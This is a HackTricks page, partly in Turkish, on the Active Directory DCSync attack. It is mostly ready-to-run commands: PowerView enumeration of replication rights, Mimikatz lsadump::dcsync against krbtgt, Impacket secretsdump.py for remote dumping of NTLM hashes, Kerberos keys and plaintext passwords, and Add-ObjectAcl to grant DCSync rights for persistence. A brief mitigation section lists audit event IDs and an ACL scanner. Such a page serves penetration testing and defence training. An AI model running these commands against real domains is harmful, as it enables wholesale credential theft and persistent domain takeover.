# DCSync

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## DCSync

**DCSync** izni, alanın kendisi üzerinde bu izinlere sahip olmayı gerektirir: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** ve **Replicating Directory Changes In Filtered Set**.

**DCSync ile ilgili Önemli Notlar:**

* **DCSync saldırısı, bir Alan Denetleyicisinin davranışını simüle eder ve diğer Alan Denetleyicilerinden bilgileri çoğaltmalarını ister**; bu, Directory Replication Service Remote Protocol (MS-DRSR) kullanılarak yapılır. MS-DRSR, Active Directory'nin geçerli ve gerekli bir işlevi olduğundan, kapatılamaz veya devre dışı bırakılamaz.
* Varsayılan olarak yalnızca **Domain Admins, Enterprise Admins, Administrators ve Domain Controllers** grupları gerekli ayrıcalıklara sahiptir.
* Herhangi bir hesap parolası tersine çevrilebilir şifreleme ile saklanıyorsa, Mimikatz'ta parolayı düz metin olarak döndürmek için bir seçenek mevcuttur.

### Enumeration

Bu izinlere kimin sahip olduğunu kontrol etmek için `powerview` kullanın:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Yerel Olarak Sömürme
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Uzaktan Sömürü
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` 3 dosya oluşturur:

* biri **NTLM hash'leri** ile
* biri **Kerberos anahtarları** ile
* biri de [**tersine şifreleme**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkin olan herhangi bir hesap için NTDS'den düz metin şifreleri ile. Tersine şifreleme ile kullanıcıları şu şekilde alabilirsiniz:

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Süreklilik

Eğer bir alan yöneticisiyseniz, bu izinleri `powerview` yardımıyla herhangi bir kullanıcıya verebilirsiniz:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Sonra, **kullanıcının 3 ayrıcalığın doğru bir şekilde atanıp atanmadığını kontrol edebilirsiniz** (ayrıcalıkların adlarını "ObjectType" alanında görebilmelisiniz) çıktıda arayarak:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

* Güvenlik Olayı ID 4662 (Nesne için Denetim Politikası etkin olmalıdır) – Bir nesne üzerinde bir işlem gerçekleştirildi
* Güvenlik Olayı ID 5136 (Nesne için Denetim Politikası etkin olmalıdır) – Bir dizin hizmeti nesnesi değiştirildi
* Güvenlik Olayı ID 4670 (Nesne için Denetim Politikası etkin olmalıdır) – Bir nesne üzerindeki izinler değiştirildi
* AD ACL Tarayıcı - ACL'lerin raporlarını oluşturun ve karşılaştırın. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
